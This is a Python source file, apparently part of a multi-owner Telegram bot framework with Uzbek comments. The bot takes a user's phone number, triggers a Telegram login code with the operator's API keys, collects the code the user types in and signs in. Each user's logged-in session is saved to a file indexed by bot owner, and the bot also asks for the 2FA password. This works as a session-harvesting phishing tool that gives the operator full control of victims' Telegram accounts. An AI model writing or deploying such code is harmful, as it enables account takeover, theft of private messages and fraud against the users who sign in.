import re
from aiogram import Router, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from telethon.errors import SessionPasswordNeededError
from telethon import TelegramClient

from .session_service import get_session_path
from .config import API_ID, API_HASH


def create_router(texts, bot_id, owner_id):
    router = Router()
    user_states = {}

    phone_regex = re.compile(r"^\+?\d{9,15}$")

    @router.message(F.text == "/start")
    async def start_handler(message: Message):
        kb = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="📱 Telefon", request_contact=True)]],
            resize_keyboard=True,
        )
        user_states[message.from_user.id] = {"state": "phone"}
        await message.answer(texts.get("start", "Start"), reply_markup=kb)

    # CONTACT orqali telefon
    @router.message(F.contact)
    async def contact_handler(message: Message):
        phone = message.contact.phone_number
        await process_phone(message, phone)

    # TEXT orqali telefon
    @router.message(F.text)
    async def text_handler(message: Message):
        state = user_states.get(message.from_user.id)

        # agar telefon bosqichida bo‘lsa
        if state and state.get("state") == "phone":
            phone = message.text.strip()

            if not phone_regex.match(phone):
                await message.answer(
                    "Telefonni to‘g‘ri formatda yuboring: +998901234567"
                )
                return

            await process_phone(message, phone)
            return

        # agar kod bosqichida bo‘lsa
        if state and state.get("state") == "code":
            await process_code(message)
            return

    async def process_phone(message: Message, phone: str):
        user_id = message.from_user.id

        session_path = get_session_path(owner_id,bot_id, user_id)
        client = TelegramClient(session_path, API_ID, API_HASH)

        await client.connect()

        try:
            result = await client.send_code_request(phone)
            await client.disconnect()
        except Exception as e:
            print("CODE REQUEST ERROR:", e)
            await message.answer(texts.get("error", "Xatolik"))
            return

        user_states[user_id] = {
            "state": "code",
            "phone": phone,
            "code_hash": result.phone_code_hash,
        }

        await message.answer(texts.get("code_request", "Kod kiriting"))

    async def process_code(message: Message):
        state = user_states.get(message.from_user.id)
        if not state:
            return

        user_id = message.from_user.id
        phone = state["phone"]
        code = message.text.strip()
        code_hash = state["code_hash"]

        session_path = get_session_path(owner_id, bot_id, user_id)
        client = TelegramClient(session_path, API_ID, API_HASH)

        await client.connect()

        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
            await client.disconnect()
            user_states.pop(user_id, None)
            await message.answer(texts.get("success", "Success"))

        except SessionPasswordNeededError:
            user_states[user_id]["state"] = "password"
            await message.answer("2FA parolni kiriting")

        except Exception as e:
            print("SIGN IN ERROR:", e)
            await message.answer(texts.get("retry", "Qayta urinib ko‘ring"))

    return router
